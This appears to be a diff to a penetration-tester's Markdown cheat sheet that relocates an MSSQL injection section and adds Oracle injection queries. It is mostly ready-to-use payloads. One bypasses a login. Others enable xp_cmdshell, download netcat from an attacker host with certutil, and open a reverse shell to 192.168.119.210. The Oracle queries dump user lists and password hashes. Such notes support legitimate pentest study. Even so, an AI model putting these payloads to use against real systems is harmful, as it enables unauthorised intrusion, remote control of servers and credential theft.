@@ -85,18 +85,6 @@ SQL Injection
 2. Manually test payloads or use Burp Intruder with SQL payloads.
 3. Grab password hashes or perform code exec to obtain reverse shell.
 
-MSSQL Injection
-```
-/login.asp?name=admin'%20or%20'1'%3d'1'--&pass=asdf # bypass login
-
-';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; # enable xp_cmdshell code exec
-';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;           # enable xp_cmdshell code exec
-';EXEC%20xp_cmdshell%20'ping%20192.168.119.210'--            # test code exec
-
-';EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://[kali]/nc.exe'-- # upload netcat
-';EXEC xp_cmdshell 'nc 192.168.119.210 443 -e cmd.exe'--    # initiate reverse shell connection
-```
-
 Apache Shellchock (/cgi-bin/*.cgi])
 ```
 # Test if vulnerable
@@ -223,14 +211,54 @@ $ ldapsearch -x -b "dc=acme,dc=com" "*" -h [target]
 ```
 
 
-### MS SQL [1433 TCP]
+### MSSQL [1433 TCP]
+
+MSSQL client
 ```
 # Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
 $ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
 $ sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 ```
 
-### MuSQL [3306 TCP]
+MSSQL Injection
+```
+/login.asp?name=admin'%20or%20'1'%3d'1'--&pass=asdf # bypass login
+
+param=';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; # enable xp_cmdshell code exec
+param=';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;           # enable xp_cmdshell code exec
+param=';EXEC%20xp_cmdshell%20'ping%20192.168.119.210'--            # test code exec
+
+param=';EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://[kali]/nc.exe'-- # upload netcat
+param=';EXEC xp_cmdshell 'nc 192.168.119.210 443 -e cmd.exe'--    # initiate reverse shell connection
+```
+
+### Oracle TNS Listener - indicator of OracleDB [1521 TCP]
+
+OracleDB injection
+```
+# Current user
+param='UNION SELECT user,null,null FROM dual--
+
+# List users
+param='UNION SELECT name FROM sys.user$;--
+param='UNION SELECT username FROM all_users ORDER BY username;--
+
+# Grab hashes
+param='UNION SELECT name, password, astatus FROM sys.user$--
+param='UNION SELECT name,spare4 FROM sys.user$--
+
+# List all tables & owners
+param='UNION SELECT DISTINCT table_name, owner FROM all_tables--
+
+# List column names in a table
+param='union SELECT column_name,null,null FROM all_tab_columns where table_name = 'TABLE_NAME'--
+
+# Select Nth row in table
+param='union SELECT col1, col2, colN FROM (SELECT ROWNUM r, col1, col2 FROM TABLE_NAME ORDER BY col1) where r=(row_number)--
+```
+
+
+### MySQL [3306 TCP]
 
 [MySQL commands cheatsheet](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)
 
